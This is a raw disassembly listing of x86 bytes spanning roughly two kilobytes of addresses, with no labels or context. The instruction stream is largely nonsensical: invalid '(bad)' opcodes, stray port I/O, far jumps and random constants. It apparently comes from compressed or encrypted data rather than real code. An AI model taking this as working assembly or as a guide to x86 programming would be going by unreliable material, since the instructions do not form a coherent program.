  417347:	hlt    
  417348:	stos   BYTE PTR es:[edi],al
  417349:	lods   al,BYTE PTR ds:[esi]
  41734a:	fidiv  DWORD PTR ds:0x15ba8c6b
  417350:	mov    esi,0x30dd3e2e
  417355:	(bad)  
  417356:	cmp    dl,BYTE PTR [ecx]
  417358:	call   0x362c0078
  41735d:	cli    
  41735e:	sbb    al,0x34
  417360:	cmp    bh,BYTE PTR [edx+0x368a330c]
  417366:	sbb    ah,BYTE PTR [ebx+0x2a]
  417369:	jg     0x417334
  41736b:	popa   
  41736c:	lea    ecx,[ecx-0x4135c017]
  417372:	jns    0x4173e3
  417374:	adc    al,0x5b
  417376:	pop    esi
  417377:	mov    cl,al
  417379:	imul   ebp
  41737b:	push   cs
  41737c:	add    al,0x9
  41737e:	retf   0x7c2e
  417381:	add    ebp,esp
  417383:	jecxz  0x4173d4
  417385:	fistp  WORD PTR [ebp-0x29]
  417388:	lock and eax,0x6ae8dcdf
  41738e:	test   ecx,0xddcc3ad4
  417394:	out    dx,al
  417395:	cmp    eax,0xa2c31f84
  41739a:	cmp    al,0xa6
  41739c:	idiv   DWORD PTR [ecx-0x79]
  41739f:	xor    BYTE PTR [si+0x59],al
  4173a3:	push   0x7
  4173a5:	push   eax
  4173a6:	ja     0x4173e3
  4173a8:	addr16 mov edx,0xdc654b63
  4173ae:	fstp   QWORD PTR [edx-0x4c]
  4173b1:	ss ins BYTE PTR es:[edi],dx
  4173b3:	or     eax,DWORD PTR [edi+0x54]
  4173b6:	sbb    eax,0x6e8de38c
  4173bb:	sub    esi,ecx
  4173bd:	add    al,0xe7
  4173bf:	dec    esp
  4173c0:	div    BYTE PTR [ecx-0x5]
  4173c3:	mov    ecx,DWORD PTR [ebx]
  4173c5:	sbb    eax,0x5b9e21b8
  4173ca:	inc    edi
  4173cb:	loope  0x4173cf
  4173cd:	sub    dl,BYTE PTR [ebp+esi*1+0x55c158f4]
  4173d4:	stc    
  4173d5:	mul    DWORD PTR [edi+0x31]
  4173d8:	dec    ecx
  4173d9:	imul   ecx,ecx,0xffffff8f
  4173dc:	adc    al,BYTE PTR [ecx]
  4173de:	add    ah,BYTE PTR [esi]
  4173e0:	call   0x2150:0xc56fca20
  4173e7:	pop    es
  4173e8:	data16 and ah,bh
  4173eb:	or     BYTE PTR fs:[ebp+0x4c7fff9b],cl
  4173f2:	retf   0x3742
  4173f5:	popa   
  4173f6:	push   edi
  4173f7:	sub    BYTE PTR [eax-0x79],0xf5
  4173fb:	aam    0x41
  4173fd:	popf   
  4173fe:	mov    bl,0xb7
  417400:	cdq    
  417401:	mov    ds:0x7b7a8210,eax
  417406:	in     eax,0x5e
  417408:	mov    dh,0xbd
  41740a:	or     BYTE PTR [edx+0x4f],al
  41740d:	(bad)  
  41740e:	ins    DWORD PTR es:[edi],dx
  41740f:	inc    edx
  417410:	pop    ecx
  417411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417412:	into   
  417413:	push   eax
  417414:	xchg   DWORD PTR [ebx+0x7c],edi
  417417:	test   BYTE PTR [edx+edx*4-0x1e45e7b2],ch
  41741e:	adc    eax,0xb74f6e18
  417423:	add    al,0xf1
  417425:	add    DWORD PTR [esi+0x10942661],ebx
  41742b:	pop    ecx
  41742c:	stos   DWORD PTR es:[edi],eax
  41742d:	dec    edi
  41742e:	xor    al,0x3b
  417430:	xchg   esp,eax
  417431:	mov    ds:0x7eb9b626,eax
  417436:	jmp    0x9544:0x57813ead
  41743d:	jle    0x417474
  41743f:	push   eax
  417440:	in     al,0x81
  417442:	add    BYTE PTR [edx],0xb8
  417445:	sbb    eax,0x5268d1dc
  41744a:	jo     0x41744f
  41744c:	dec    ebp
  41744d:	cmp    cl,BYTE PTR [edi]
  41744f:	lock add bh,cl
  417452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417453:	xor    bl,bh
  417455:	sbb    eax,0xdc15c136
  41745a:	push   0xcdb06d3
  41745f:	cdq    
  417460:	and    al,0xc
  417462:	mov    edi,0x2310bb08
  417467:	mov    eax,0x2a442ba8
  41746c:	(bad)  
  41746d:	(bad)  
  41746e:	sbb    BYTE PTR [edi+0x41],ch
  417471:	add    DWORD PTR ds:0x641364cd,ebp
  417477:	dec    esi
  417478:	(bad)  
  417479:	push   ecx
  41747a:	mov    edi,0x41752c7f
  41747f:	retf   0x71cf
  417482:	push   esp
  417483:	pop    ebx
  417484:	cdq    
  417485:	sti    
  417486:	addr16 add al,0x31
  417489:	test   DWORD PTR [edx-0x3f],esp
  41748c:	in     al,dx
  41748d:	out    dx,al
  41748e:	popf   
  41748f:	push   ebx
  417490:	mov    esi,0x18d4d003
  417495:	xchg   DWORD PTR [edi],esp
  417497:	adc    dl,BYTE PTR ds:0xafac29aa
  41749d:	adc    al,0x30
  41749f:	shr    DWORD PTR [edi+ebx*1],0x8f
  4174a3:	les    edx,FWORD PTR [edi+0x7030bcf]
  4174a9:	mov    ch,BYTE PTR [eax+0x568520fc]
  4174af:	mov    ds:0xa5bce998,al
  4174b4:	(bad)  
  4174b5:	cmp    ebx,ebp
  4174b7:	pop    esp
  4174b8:	loopne 0x417516
  4174ba:	outs   dx,DWORD PTR ds:[esi]
  4174bb:	fnstcw WORD PTR [eax+ebx*2+0x1d]
  4174bf:	adc    DWORD PTR [esi+0x62],0x1c
  4174c3:	ins    BYTE PTR es:[edi],dx
  4174c4:	cdq    
  4174c5:	mov    bl,0x2c
  4174c7:	repnz cmp BYTE PTR [ebp-0x12],dl
  4174cb:	fdivr  DWORD PTR [ecx+0xb8251c1]
  4174d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174d2:	pushf  
  4174d3:	(bad)  
  4174d4:	pop    edi
  4174d5:	pop    edi
  4174d6:	pop    ecx
  4174d7:	pop    edi
  4174d8:	sub    DWORD PTR [edx+0x1b],ebp
  4174db:	jg     0x4174c7
  4174dd:	push   ebp
  4174de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174df:	pop    esi
  4174e0:	arpl   di,dx
  4174e2:	data16 jnp 0x417508
  4174e5:	and    BYTE PTR [esi+0x6c],0xd3
  4174e9:	push   ebp
  4174ea:	dec    ebp
  4174eb:	out    dx,al
  4174ec:	mov    al,ss:0xbdcc3cf1
  4174f2:	and    al,ah
  4174f4:	adc    DWORD PTR ds:0x743c4514,0xffffffcc
  4174fb:	je     0x417547
  4174fd:	dec    edi
  4174fe:	mov    ebx,0x9f675cbd
  417503:	fs jle 0x417527
  417506:	xor    bh,bl
  417508:	lock cs jle 0x417522
  41750c:	jle    0x41754a
  41750e:	imul   ebx,DWORD PTR [eax-0x48f12097],0x21
  417515:	repnz aam 0x7f
  417518:	mov    ds:0x10da96c6,eax
  41751d:	fmul   st(4),st
  41751f:	inc    eax
  417520:	in     al,dx
  417521:	xchg   ebp,edi
  417523:	push   edi
  417524:	mov    bl,0x9f
  417526:	xchg   esp,eax
  417527:	imul   edx,DWORD PTR [eax-0xc],0x33
  41752b:	in     al,0xad
  41752d:	int3   
  41752e:	mov    ds:0x48a5e03d,al
  417533:	into   
  417534:	xor    edi,DWORD PTR [ebp+0x3f]
  417537:	mul    BYTE PTR [ecx+ecx*8]
  41753a:	or     DWORD PTR [ebp-0x1f],ebp
  41753d:	push   esp
  41753e:	or     edx,DWORD PTR [edi+edx*1+0xc17b778]
  417545:	ds loope 0x41754d
  417548:	cwde   
  417549:	scas   al,BYTE PTR es:[edi]
  41754a:	dec    esi
  41754b:	cmp    eax,0x915e6e04
  417550:	inc    edx
  417551:	mov    ds:0xec5b9973,al
  417556:	push   edi
  417557:	mov    al,ds:0xc1c59b36
  41755c:	add    eax,0x33a5b469
  417561:	cmp    ebp,eax
  417563:	xor    ah,bl
  417565:	sub    edi,DWORD PTR ds:0x81c3c876
  41756b:	add    al,0xfc
  41756d:	jmp    0x30968ceb
  417572:	ds ins DWORD PTR es:[edi],dx
  417574:	fs mov ch,0x64
  417577:	mov    esi,0xf7b579e8
  41757c:	in     al,dx
  41757d:	inc    ebx
  41757e:	cmp    eax,0x771b7bc2
  417583:	imul   esi,DWORD PTR [edi+0x556dc420],0xfb9a3ba8
  41758d:	jmp    0x53c2429f
  417592:	sbb    BYTE PTR [ebx+0x1700dfb7],cl
  417598:	(bad)  
  417599:	adc    DWORD PTR [edx-0x2f],ebx
  41759c:	jl     0x4175da
  41759e:	mov    eax,ds:0xa1b6c826
  4175a3:	or     DWORD PTR [ebx-0x3300df60],edx
  4175a9:	jg     0x4175f2
  4175ab:	leave  
  4175ac:	xchg   edi,eax
  4175ad:	add    DWORD PTR [ebp+0x77],ecx
  4175b0:	(bad)  
  4175b1:	retf   0x56c7
  4175b4:	push   ebp
  4175b5:	daa    
  4175b6:	out    0xd6,eax
  4175b8:	push   edi
  4175b9:	push   ecx
  4175ba:	popf   
  4175bb:	stos   BYTE PTR es:[edi],al
  4175bc:	mov    ah,0x74
  4175be:	or     DWORD PTR ds:0xd07f0deb,ecx
  4175c4:	jnp    0x41757c
  4175c6:	ja     0x41759a
  4175c8:	repnz inc edx
  4175ca:	(bad)  
  4175cb:	ror    DWORD PTR [esi+0xa],1
  4175ce:	and    dl,ah
  4175d0:	das    
  4175d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d2:	jg     0x417618
  4175d4:	sub    DWORD PTR [ebx-0x3e],esi
  4175d7:	adc    eax,0x3e6e947d
  4175dc:	gs call 0x49c7:0xdc02bcee
  4175e4:	xor    al,0x55
  4175e6:	out    0x54,al
  4175e8:	enter  0xac,0x8f
  4175ec:	mov    ds:0xb8a8283e,al
  4175f1:	add    BYTE PTR [ebx-0x20b650b6],cl
  4175f7:	and    esp,0x4a7c4e12
  4175fd:	clc    
  4175fe:	(bad)  
  4175ff:	repz jge 0x4175e0
  417602:	sub    al,0x80
  417604:	adc    edx,eax
  417606:	test   DWORD PTR [edx-0x18],eax
  417609:	outs   dx,DWORD PTR ds:[esi]
  41760a:	dec    ecx
  41760b:	and    eax,0x80a90b40
  417610:	daa    
  417611:	mov    al,0x87
  417613:	rcl    ebx,0xd8
  417616:	mov    ds:0x6b8a832,eax
  41761b:	aad    0x1e
  41761d:	mov    edi,ebp
  41761f:	rol    ch,1
  417621:	jb     0x4175dc
  417623:	jae    0x41767f
  417625:	dec    eax
  417626:	dec    esi
  417627:	into   
  417628:	xor    BYTE PTR [eax],bh
  41762a:	xor    BYTE PTR [ebp*2-0x6cdd7edf],ch
  417631:	mov    esi,0x8eb37732
  417636:	pushf  
  417637:	imul   eax,DWORD PTR [eax],0x86446b33
  41763d:	push   eax
  41763e:	test   BYTE PTR [edx+0x2978109f],0xae
  417645:	fstp   st(5)
  417647:	sbb    BYTE PTR [esi+esi*4],ch
  41764a:	cmp    esp,esi
  41764c:	add    eax,0xeb0e7d19
  417651:	adc    BYTE PTR [esp+eax*4-0x6ae60f5e],dl
  417658:	pushf  
  417659:	cld    
  41765a:	mov    ds:0xb48ecca2,al
  41765f:	mov    ebp,0x8ee3bc16
  417664:	xlat   BYTE PTR ds:[ebx]
  417665:	stos   BYTE PTR es:[edi],al
  417666:	pop    DWORD PTR [edi-0x68f613af]
  41766c:	mov    cl,dl
  41766e:	inc    ecx
  41766f:	push   ss
  417670:	sub    al,0x77
  417672:	inc    edx
  417673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417674:	lea    edi,[ebp-0xd]
  417677:	push   0xffffffcd
  417679:	test   al,0x26
  41767c:	loopne 0x41768a
  41767e:	mov    eax,ds:0xf6da075e
  417683:	imul   ecx,DWORD PTR [edi],0x44beadd3
  417689:	jo     0x4176e2
  41768b:	sub    ch,bl
  41768d:	mov    ebx,0xc57d37db
  417692:	mov    bh,0x22
  417694:	ins    DWORD PTR es:[edi],dx
  417695:	sbb    ecx,DWORD PTR [ecx+eax*8+0x287ea116]
  41769c:	stos   DWORD PTR es:[edi],eax
  41769d:	ret    
  41769e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41769f:	pop    ebx
  4176a0:	add    esp,ecx
  4176a2:	imul   edx,DWORD PTR [ebx],0xe2f0aa1
  4176a8:	fimul  DWORD PTR [esp+eax*2]
  4176ab:	sbb    DWORD PTR gs:[eax-0x789412d9],ebp
  4176b2:	and    DWORD PTR [edi+eax*8],eax
  4176b5:	ins    BYTE PTR es:[edi],dx
  4176b6:	iret   
  4176b7:	or     DWORD PTR [edi+ebx*2],0xa5253164
  4176be:	mov    ds:0x3d36adde,al
  4176c3:	dec    ebp
  4176c4:	sub    BYTE PTR [edi+eax*4],ch
  4176c7:	bound  edi,QWORD PTR [ebp-0x54]
  4176ca:	fist   DWORD PTR [ebx+0x13]
  4176cd:	arpl   WORD PTR [esi-0x3809acbe],dx
  4176d3:	bound  esp,QWORD PTR [esi-0x2eb9e753]
  4176d9:	or     al,0x77
  4176db:	out    0x94,eax
  4176dd:	fidivr WORD PTR [ecx]
  4176df:	imul   ebx,DWORD PTR [ebx+0x70a90027],0xbf60c36e
  4176e9:	scas   al,BYTE PTR es:[edi]
  4176ea:	jnp    0x4176e3
  4176ec:	or     eax,ebx
  4176ee:	add    al,bh
  4176f0:	or     al,0xec
  4176f2:	mov    bl,0xcf
  4176f4:	mov    dh,BYTE PTR [eax+0x5d]
  4176f7:	push   esp
  4176f8:	mov    edx,0xdad5c49d
  4176fd:	cmp    ebp,DWORD PTR [ebp*1-0x4ce9c16c]
  417704:	jg     0x417773
  417706:	fisttp DWORD PTR [ecx+ebx*1]
  417709:	mov    al,0xf7
  41770b:	dec    ebx
  41770c:	mov    dl,BYTE PTR [eax+0x32]
  41770f:	sbb    BYTE PTR [ecx*1+0xc2fae2a],cl
  417716:	or     al,0xe6
  417718:	mov    ebx,0xf24fa01a
  41771d:	test   DWORD PTR [ebx],esp
  41771f:	xchg   edx,eax
  417720:	dec    ebp
  417721:	mov    ah,0x66
  417723:	sahf   
  417724:	sbb    BYTE PTR [edi+0x2dc2350f],bh
  41772a:	(bad)  
  41772b:	stc    
  41772c:	je     0x4176e2
  41772e:	dec    ebp
  41772f:	(bad)  
  417730:	adc    al,0xc2
  417732:	call   0x7a1:0x43465ee9
  417739:	add    ebx,DWORD PTR [eax+0x47]
  41773c:	pop    edi
  41773d:	inc    ebp
  41773e:	sbb    al,0x29
  417740:	xrelease mov DWORD PTR [esi+0x19],esi
  417744:	les    ebp,FWORD PTR [ebx]
  417746:	fxam   
  417748:	xchg   esi,eax
  417749:	rcl    BYTE PTR [ecx],1
  41774b:	aas    
  41774c:	mov    ecx,0x13739eed
  417751:	adc    bl,BYTE PTR [eax-0x75]
  417754:	jl     0x41778a
  417756:	int3   
  417757:	jp     0x4176fd
  417759:	cmp    eax,ebx
  41775b:	(bad)  
  41775c:	aaa    
  41775d:	inc    ebx
  41775e:	loope  0x4177a7
  417760:	sub    eax,0x39c33112
  417765:	push   ecx
  417766:	lods   eax,DWORD PTR ds:[esi]
  417767:	dec    ebx
  417768:	sbb    BYTE PTR [ecx-0x444089ad],dh
  41776e:	mov    cl,0x45
  417770:	sbb    al,0x38
  417773:	out    0x2b,al
  417775:	pop    eax
  417776:	pop    ss
  417777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417778:	scas   al,BYTE PTR es:[edi]
  417779:	sbb    ch,BYTE PTR [eax+0x2]
  41777c:	jne    0x4177bb
  41777e:	xor    DWORD PTR [edx],esi
  417780:	inc    esi
  417781:	fstp   QWORD PTR [esp+ecx*4-0x5311c350]
  417788:	cmc    
  417789:	(bad)  
  41778a:	mov    ds:0x50ddc1a0,eax
  41778f:	test   al,0x4c
  417791:	xchg   ebp,eax
  417792:	xor    eax,0x52f667e3
  417797:	into   
  417798:	adc    bl,BYTE PTR [edx]
  41779a:	mov    ah,0x9c
  41779c:	and    bl,0xc0
  41779f:	dec    di
  4177a1:	adc    ch,BYTE PTR [ebx+0x3c]
  4177a4:	sbb    esi,esp
  4177a6:	sar    eax,cl
  4177a8:	sub    BYTE PTR [eax],0xd3
  4177ab:	ret    
  4177ac:	pusha  
  4177ad:	in     eax,dx
  4177ae:	clc    
  4177af:	(bad)  
  4177b0:	jmp    0x32756213
  4177b5:	jae    0x4177a1
  4177b7:	add    eax,0x33cc3c98
  4177bc:	call   DWORD PTR ds:0xff81bb5f
  4177c2:	dec    ebx
  4177c3:	das    
  4177c4:	(bad)  
  4177c5:	in     al,dx
  4177c6:	xchg   edi,eax
  4177c7:	pop    es
  4177c8:	je     0x417794
  4177ca:	mov    esi,0x12731387
  4177cf:	mov    esi,0x68922f10
  4177d4:	aaa    
  4177d5:	mov    gs,WORD PTR [eax-0x61]
  4177d8:	sub    esi,DWORD PTR [edx]
  4177da:	mov    esp,0x936e5e00
  4177df:	scas   al,BYTE PTR es:[edi]
  4177e0:	stc    
  4177e1:	cld    
  4177e2:	nop
  4177e3:	jl     0x417776
  4177e5:	(bad)  
  4177e6:	je     0x417861
  4177e8:	sbb    ch,cl
  4177ea:	pop    ecx
  4177eb:	fs xor al,0x5
  4177ee:	dec    ecx
  4177ef:	fdivr  QWORD PTR [ecx-0x3f]
  4177f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f3:	sbb    eax,0xf18a52ce
  4177f8:	xchg   esi,eax
  4177f9:	and    BYTE PTR [edi],dl
  4177fb:	cld    
  4177fc:	das    
  4177fd:	call   0x15d09150
  417802:	adc    eax,0x92779b09
  417807:	fld    QWORD PTR [ecx]
  417809:	pushf  
  41780a:	leave  
  41780b:	jl     0x417873
  41780d:	in     al,0xc5
  41780f:	call   0xd6795bfd
  417814:	(bad)  
  417815:	xor    eax,0xdceb6984
  41781a:	adc    DWORD PTR [ecx-0x11d9bf72],0xffffffc2
  417821:	daa    
  417822:	inc    esi
  417823:	dec    eax
  417824:	jp     0x4177de
  417826:	sbb    ax,0x5c8d
  41782a:	call   0x22af5407
  41782f:	rcl    DWORD PTR [edi],0x49
  417832:	xor    DWORD PTR ds:0x19552228,eax
  417838:	add    al,al
  41783a:	sub    DWORD PTR [esi+ebp*1-0x6b],esi
  41783e:	cbw    
  417840:	dec    ebp
  417841:	mov    ds:0xaada548c,eax
  417846:	jp     0x417853
  417848:	mov    dl,0x15
  41784a:	lds    edx,FWORD PTR [edx]
  41784c:	shl    DWORD PTR [edi+0x5418b858],1
  417852:	popa   
  417853:	les    ebp,FWORD PTR [ebx+0x28]
  417856:	aam    0xc5
  417858:	sub    dh,0xf8
  41785b:	xor    eax,DWORD PTR [esi+0x2f448ad2]
  417861:	sbb    DWORD PTR [esi-0x4da1b9ca],ebp
  417867:	adc    BYTE PTR [ebx+0x5479994e],0x1c
  41786e:	xor    BYTE PTR [ebx+0x5e],bh
  417871:	mov    eax,ds:0xa4de15ad
  417876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417877:	xchg   edx,eax
  417878:	mov    bh,ch
  41787a:	dec    ebx
  41787b:	rcr    DWORD PTR [ecx],1
  41787d:	inc    ebp
  41787e:	(bad)  
  41787f:	(bad)  
  417880:	push   0xa
  417882:	outs   dx,DWORD PTR ds:[esi]
  417883:	pop    ebp
  417884:	and    BYTE PTR [edi-0x70a3b1a],dl
  41788a:	pop    eax
  41788b:	iret   
  41788c:	mov    ch,0x2b
  41788e:	fisttp QWORD PTR [ebx-0x28]
  417891:	hlt    
  417892:	lea    ecx,[ebx]
  417894:	or     ah,0x1
  417897:	inc    edx
  417898:	(bad)  
  417899:	lahf   
  41789a:	jle    0x4178ec
  41789c:	cmp    bh,dl
  41789e:	sub    BYTE PTR [edi-0x4f],0x4d
  4178a2:	jo     0x4178d6
  4178a4:	pop    ss
  4178a5:	or     al,BYTE PTR ds:0x28065e07
  4178ab:	push   eax
  4178ac:	daa    
  4178ad:	dec    edi
  4178ae:	scas   eax,DWORD PTR es:[edi]
  4178af:	sub    al,0x7e
  4178b1:	and    ch,BYTE PTR [ebp-0x6a]
  4178b4:	test   DWORD PTR [esi],esi
  4178b6:	aas    
  4178b7:	cmp    eax,0xe4d86519
  4178bc:	ins    DWORD PTR es:[edi],dx
  4178bd:	add    bh,BYTE PTR [bp+di+0x6b]
  4178c1:	sbb    DWORD PTR [esi+esi*1+0x3564eec9],esi
  4178c8:	in     al,dx
  4178c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178cb:	lods   eax,DWORD PTR ds:[esi]
  4178cc:	inc    ecx
  4178cd:	push   edi
  4178ce:	mov    ebp,0x5d217367
  4178d3:	pop    ebx
  4178d4:	stos   BYTE PTR es:[edi],al
  4178d5:	mov    eax,0x3a9a1e51
  4178da:	lea    ebp,[edi]
  4178dc:	push   ebx
  4178dd:	ins    BYTE PTR es:[edi],dx
  4178de:	sub    al,BYTE PTR [ecx+0x332893e]
  4178e4:	adc    DWORD PTR [eax+0x77],eax
  4178e7:	cld    
  4178e8:	sahf   
  4178e9:	leave  
  4178ea:	inc    ebp
  4178eb:	lods   eax,DWORD PTR ds:[esi]
  4178ec:	mov    edi,0xc16268a9
  4178f1:	xchg   esi,eax
  4178f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f4:	jge    0x41791d
  4178f6:	fsubr  QWORD PTR [ebx+0x6ca75f91]
  4178fc:	mov    edx,gs
  4178fe:	das    
  4178ff:	jge    0x4178f3
  417901:	das    
  417902:	pop    esp
  417903:	(bad)
  417906:	(bad)  
  417907:	and    esi,DWORD PTR [ecx]
  417909:	sti    
  41790a:	xchg   BYTE PTR [ebx+0x34],bl
  41790d:	ss dec ecx
  41790f:	xchg   edx,eax
  417910:	push   eax
  417911:	xchg   edi,eax
  417912:	inc    eax
  417913:	cmp    eax,0xe836d298
  417918:	fs cdq 
  41791a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41791b:	xlat   BYTE PTR ds:[ebx]
  41791c:	sahf   
  41791d:	sbb    eax,0x2bdfe12c
  417922:	mov    edx,0xcacfd408
  417927:	jmp    0x4178bc
  417929:	or     al,0x4e
  41792b:	fs or  al,0x2c
  41792e:	push   edx
  41792f:	pop    esi
  417930:	lods   eax,DWORD PTR ds:[esi]
  417931:	xchg   ebp,eax
  417932:	inc    edi
  417933:	imul   ebx,esp,0xffffffda
  417936:	adc    BYTE PTR [edi+0x3],ah
  417939:	mov    ecx,0xaabfcf3
  41793e:	fucomip st,st(0)
  417940:	out    0x9b,al
  417942:	sub    al,0x35
  417944:	inc    edi
  417945:	add    al,0x79
  417947:	test   BYTE PTR [eax+0x3d001c35],0x5
  41794e:	or     BYTE PTR [edx+0x38],dh
  417951:	inc    eax
  417952:	mov    ecx,ss
  417954:	cs out dx,al
  417956:	inc    ebp
  417957:	sub    BYTE PTR [ebp-0x2a],ch
  41795a:	outs   dx,BYTE PTR ds:[esi]
  41795b:	aad    0x18
  41795d:	xchg   ecx,eax
  41795e:	lahf   
  41795f:	xlat   BYTE PTR ds:[ebx]
  417960:	loope  0x4178f8
  417962:	jg     0x4178ff
  417964:	popf   
  417965:	mov    ebp,0x29622d96
  41796a:	(bad)  [ebp+0x58]
  41796d:	es adc eax,0x6ed3788a
  417973:	sar    ah,cl
  417975:	arpl   WORD PTR [esi],si
  417977:	icebp  
  417978:	mov    ds:0x140ef3ad,al
  41797d:	daa    
  41797e:	mov    al,ds:0x93c0e6e7
  417983:	mov    ds:0x8a74cf00,eax
  417988:	and    BYTE PTR [esi],dh
  41798a:	jle    0x4179e2
  41798c:	push   ss
  41798d:	ds ds push es
  417990:	mov    al,0xa
  417992:	pop    ebp
  417993:	out    dx,al
  417994:	ss arpl ax,dx
  417997:	mov    dl,0xe
  417999:	nop
  41799a:	adc    DWORD PTR [edx],edi
  41799c:	sbb    DWORD PTR [edi-0x15ffec],edx
  4179a2:	xchg   esp,eax
  4179a3:	sti    
  4179a4:	or     edx,DWORD PTR [esi]
  4179a6:	mov    edx,esp
  4179a8:	mov    ch,0xb
  4179aa:	jno    0x41793a
  4179ac:	mov    al,ds:0xcec4293
  4179b1:	into   
  4179b2:	test   eax,0x9f41c5b7
  4179b7:	call   FWORD PTR [edi+0x13]
  4179ba:	xchg   ebx,eax
  4179bb:	inc    ecx
  4179bc:	inc    edi
  4179bd:	vpsllq ymm1,ymm4,XMMWORD PTR [eax+0x5c]
  4179c2:	cdq    
  4179c3:	icebp  
  4179c4:	call   0x5515:0xc912d755
  4179cb:	fstp   st(6)
  4179cd:	jbe    0x417a19
  4179cf:	js     0x417a26
  4179d1:	jb     0x417a0f
  4179d3:	mov    dl,0x78
  4179d5:	mov    fs,ebx
  4179d7:	push   edi
  4179d8:	push   ebp
  4179d9:	mov    dh,0xe4
  4179db:	mov    eax,ds:0x820c1990
  4179e0:	add    BYTE PTR [edi+0x20e392ae],ah
  4179e6:	or     edx,ebp
  4179e8:	cmc    
  4179e9:	loope  0x4179d4
  4179eb:	dec    edi
  4179ec:	cmc    
  4179ed:	jne    0x4179f1
  4179ef:	ret    
  4179f0:	push   esp
  4179f1:	cwde   
  4179f2:	adc    esi,ebp
  4179f4:	xor    al,0x97
  4179f6:	ret    
  4179f7:	popf   
  4179f8:	mov    fs:0x12deb649,eax
  4179fe:	push   ebx
  4179ff:	pop    fs
  417a01:	push   edx
  417a02:	lahf   
  417a03:	loope  0x417a2f
  417a05:	pop    es
  417a06:	mov    eax,0x9021081b
  417a0b:	(bad)  
  417a0c:	xor    edi,edx
  417a0e:	retf   0x54f9
  417a11:	jge    0x417a8a
  417a13:	es add eax,0x8353f8ca
  417a19:	lahf   
  417a1a:	mov    eax,0x42d5d7cb
  417a1f:	fs aad 0xe9
  417a22:	cmc    
  417a23:	jle    0x4179c2
  417a25:	loope  0x417a35
  417a27:	add    DWORD PTR [edi+0x2898396b],esi
  417a2d:	mov    bh,0x6f
  417a2f:	js     0x417a0b
  417a31:	js     0x417a7d
  417a33:	adc    dl,BYTE PTR [edi-0x2e55ea7f]
  417a39:	(bad)  
  417a3a:	in     al,dx
  417a3b:	cli    
  417a3c:	test   eax,0xdbbdd2c7
  417a41:	inc    ebx
  417a42:	adc    edx,DWORD PTR [edx-0x5a]
  417a45:	and    eax,0x1338b3ac
  417a4a:	or     ebp,ecx
  417a4c:	push   ebx
  417a4d:	fcomip st,st(4)
  417a4f:	fnstenv [edi+ecx*2-0xbb87f32]
  417a56:	dec    ebp
  417a57:	inc    edi
  417a58:	sbb    eax,DWORD PTR [eax+0x44444682]
  417a5e:	shr    cl,1
  417a60:	mov    al,0xe5
  417a62:	in     eax,0xe0
  417a64:	mov    ch,0x9f
  417a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a67:	sub    ah,BYTE PTR [edi]
  417a69:	inc    eax
  417a6a:	push   0x83024927
  417a6f:	into   
  417a70:	and    BYTE PTR [edx-0x68],dl
  417a73:	popf   
  417a74:	loop   0x417a27
  417a76:	shr    BYTE PTR [esi+0x3927d4c4],0x8f
  417a7d:	rcl    BYTE PTR gs:[ebp+0x4485e8db],cl
  417a84:	pop    ecx
  417a85:	fld    TBYTE PTR [esi-0x151e2678]
  417a8b:	dec    ebp
  417a8c:	mov    cl,0x94
  417a8e:	fs mov ebp,0xaa850abf
  417a94:	aas    
  417a95:	xchg   esi,eax
  417a96:	push   eax
  417a97:	push   eax
  417a98:	and    bh,bh
  417a9a:	push   cs
  417a9b:	pop    esp
  417a9c:	stc    
  417a9d:	mov    eax,0xd34cd919
  417aa2:	mov    dl,0xc3
  417aa4:	lods   eax,DWORD PTR ds:[esi]
  417aa5:	jg     0x417af7
  417aa7:	pop    edi
  417aa8:	add    esp,ebp
  417aaa:	jno    0x417a2c
  417aac:	jbe    0x417b0f
  417aae:	shr    DWORD PTR [ecx],1
  417ab0:	or     ch,BYTE PTR [edx]
  417ab2:	mov    edi,0xbb4ad06a
  417ab7:	das    
  417ab8:	inc    edx
  417ab9:	call   DWORD PTR [ebx+0x5f]
  417abc:	bound  eax,QWORD PTR [edi]
  417abe:	jmp    0x2659:0xd931dc75
  417ac5:	pop    ds
  417ac6:	test   eax,0x6db6533a
  417acb:	packsswb mm3,QWORD PTR [eax+ecx*2]
  417acf:	and    dl,dl
  417ad1:	xchg   esp,eax
  417ad2:	jb     0x417ad8
  417ad4:	xor    al,0xef
  417ad6:	xor    eax,0x7e30db64
  417adb:	ja     0x417a83
  417add:	or     al,0xc9
  417adf:	std    
  417ae0:	adc    eax,DWORD PTR [edx-0x1909c637]
  417ae6:	call   0x10ef976f
  417aeb:	sub    cl,bl
  417aed:	mov    eax,0xf9b08fa5
  417af2:	stc    
  417af3:	or     eax,0x8e7436a3
  417af8:	mov    ds:0x838625de,al
  417afd:	ror    BYTE PTR [eax],0xe0
  417b00:	fucomp st(3)
  417b02:	shr    al,0x7e
  417b05:	js     0x417b3b
  417b07:	mov    WORD PTR [edi+eiz*8-0x292bac49],ds
  417b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b0f:	push   edi
  417b10:	enter  0xba2b,0x22
  417b14:	pop    ds
  417b15:	lods   al,BYTE PTR ds:[esi]
  417b16:	imul   edx,DWORD PTR [esi],0x2161bbb
  417b1c:	sbb    eax,0xcebf1b5a
  417b21:	rdpmc  
  417b23:	mov    DWORD PTR [esi],eax
  417b25:	pop    ecx
  417b26:	mov    esp,0xb17890d4
  417b2b:	nop
  417b2c:	sbb    DWORD PTR gs:[edi+0x6e],ebx
  417b30:	mov    BYTE PTR [eax-0x10],dh
  417b33:	retf   
  417b34:	mov    esi,0x58f264f4
  417b39:	stc    
  417b3a:	lea    ebp,[eax+eiz*1]
  417b3d:	or     dl,ch
  417b3f:	(bad)  
  417b40:	inc    ecx
  417b41:	int3   
